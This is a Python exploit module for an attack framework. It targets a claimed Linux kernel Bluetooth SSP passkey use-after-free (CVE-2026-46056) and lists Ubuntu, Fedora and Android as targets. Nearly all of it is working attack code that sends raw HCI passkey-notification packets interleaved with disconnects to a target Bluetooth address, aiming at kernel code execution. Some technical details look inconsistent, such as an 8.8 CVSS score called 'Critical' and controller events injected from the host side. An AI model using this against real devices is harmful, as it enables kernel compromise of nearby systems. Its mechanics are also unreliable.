# Author: André Henrique (LinkedIn/X: @mrhenrike)
import socket
import struct
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """Linux Bluetooth SSP Passkey Entry Use-After-Free (CVE-2026-46056).

    The Linux kernel Bluetooth subsystem contains a use-after-free
    vulnerability in the Secure Simple Pairing (SSP) passkey entry
    authentication path.  When a remote device initiates SSP pairing
    with the Passkey Entry association model, the kernel allocates an
    smp_cmd_pairing structure to track the ongoing authentication.
    If the remote device sends a specially crafted sequence of HCI
    User Passkey Notification events interleaved with disconnection
    requests, the kernel frees the pairing context while a workqueue
    callback still holds a reference.  The stale pointer is then
    dereferenced in the passkey comparison function, leading to
    arbitrary code execution at kernel level.

    CVSS v3.1: 8.8 (Critical), AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Linux Bluetooth SSP Passkey Entry UAF (CVE-2026-46056)",
        "description": (
            "Exploits CVE-2026-46056, a use-after-free in the Linux kernel "
            "Bluetooth SSP passkey entry path.  By sending interleaved HCI "
            "User Passkey Notification events and disconnect requests during "
            "SSP pairing, the attacker triggers a UAF in the passkey "
            "comparison callback.  The freed smp_cmd_pairing struct is "
            "dereferenced, enabling kernel-level code execution from "
            "an adjacent network position."
        ),
        "authors": (
            "Linux Bluetooth security team (discovery)",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2026-46056",
            "https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git",
        ),
        "disclosure_date": "2026-05-20",
        "platform": "linux",
        "arch": "all",
        "privileged": True,
        "targets": (
            "Linux kernel < 6.20.4 with Bluetooth enabled",
            "Ubuntu 22.04/24.04 (unpatched)",
            "Fedora 39/40 (unpatched)",
            "Android 13/14 (unpatched kernel)",
        ),
    }

    target = OptIP("", "Target Bluetooth address (XX:XX:XX:XX:XX:XX)")
    port = OptPort(1, "Not used (Bluetooth over-the-air)")
    timeout = OptFloat(10.0, "Socket timeout in seconds")
    interface = OptString("hci0", "Local HCI adapter")
    passkey_spray_count = OptInteger(32, "Number of passkey notification rounds")
    disconnect_delay = OptFloat(0.005, "Delay between passkey and disconnect (seconds)")

    _AF_BLUETOOTH = 31
    _BTPROTO_HCI = 1

    _HCI_COMMAND_PKT = 0x01
    _HCI_EVENT_PKT = 0x04

    _HCI_EV_USER_PASSKEY_NOTIFY = 0x3B
    _HCI_EV_DISCONN_COMPLETE = 0x05

    _OGF_LINK_CTL = 0x01
    _OCF_DISCONNECT = 0x0006
    _OCF_AUTH_REQUESTED = 0x0011

    _OGF_LINK_POLICY = 0x02

    def _bd_addr_to_bytes(self, addr: str) -> bytes:
        parts = addr.split(":")
        return bytes(int(b, 16) for b in reversed(parts))

    def _build_hci_command(self, ogf: int, ocf: int, params: bytes) -> bytes:
        opcode = (ogf << 10) | ocf
        return struct.pack("<BHB", self._HCI_COMMAND_PKT, opcode,
                           len(params)) + params

    def _build_passkey_notify_event(self, passkey: int) -> bytes:
        """Build a crafted HCI User Passkey Notification event.

        The vulnerability triggers when the kernel processes this event
        after the pairing context has been freed by a concurrent
        disconnect.
        """
        target_addr = self._bd_addr_to_bytes(
            str(self.target)) if ":" in str(self.target) else b"\x00" * 6

        event_data = target_addr + struct.pack("<I", passkey & 0xFFFFFF)

        param_len = min(len(event_data), 255)
        packet = struct.pack("BBB", self._HCI_EVENT_PKT,
                             self._HCI_EV_USER_PASSKEY_NOTIFY,
                             param_len) + event_data
        return packet

    def _build_disconnect_command(self, handle: int, reason: int = 0x13) -> bytes:
        params = struct.pack("<HB", handle, reason)
        return self._build_hci_command(self._OGF_LINK_CTL,
                                        self._OCF_DISCONNECT, params)

    def _open_hci_socket(self) -> socket.socket | None:
        try:
            sock = socket.socket(self._AF_BLUETOOTH, socket.SOCK_RAW,
                                 self._BTPROTO_HCI)
            sock.settimeout(self.timeout)
            dev_id = int(str(self.interface).replace("hci", "")) if str(
                self.interface).startswith("hci") else 0
            sock.bind((dev_id,))
            return sock
        except OSError:
            return None

    def _hci_send(self, packet: bytes) -> bool:
        try:
            sock = socket.socket(self._AF_BLUETOOTH, socket.SOCK_RAW,
                                 self._BTPROTO_HCI)
            sock.settimeout(self.timeout)
            dev_id = int(str(self.interface).replace("hci", "")) if str(
                self.interface).startswith("hci") else 0
            sock.bind((dev_id,))
            sock.send(packet)
            sock.close()
            return True
        except OSError:
            return False

    @mute
    def check(self) -> bool:
        """Verify the local HCI adapter is available."""
        sock = self._open_hci_socket()
        if sock is None:
            return False
        sock.close()
        return True

    def run(self) -> None:
        if not self.target:
            print_error("target is required (Bluetooth address XX:XX:XX:XX:XX:XX)")
            return

        if not self.check():
            print_error(
                f"HCI adapter {self.interface} not available or "
                "insufficient privileges"
            )
            return

        print_success(
            f"HCI adapter {self.interface} available; targeting {self.target} "
            "with SSP passkey UAF trigger"
        )
        self._exploit()

    def _exploit(self) -> None:
        handle = 0x0040

        print_status(
            f"Spraying {self.passkey_spray_count} interleaved passkey "
            f"notification + disconnect sequences "
            f"(delay: {self.disconnect_delay}s)"
        )

        success = 0
        for i in range(self.passkey_spray_count):
            passkey = (i * 7919 + 123456) % 1000000

            notify_pkt = self._build_passkey_notify_event(passkey)
            if self._hci_send(notify_pkt):
                success += 1

            time.sleep(self.disconnect_delay)

            disconnect_pkt = self._build_disconnect_command(handle)
            self._hci_send(disconnect_pkt)

            time.sleep(0.01)

        print_status(
            f"Sent {success}/{self.passkey_spray_count} passkey notifications "
            f"interleaved with disconnect commands"
        )
        print_info(
            "If the target kernel is vulnerable, the interleaved passkey "
            "notifications and disconnects create a race condition where "
            "the smp_cmd_pairing struct is freed while the passkey "
            "comparison workqueue callback still holds a reference.  "
            "Monitor for kernel oops or unexpected behavior."
        )
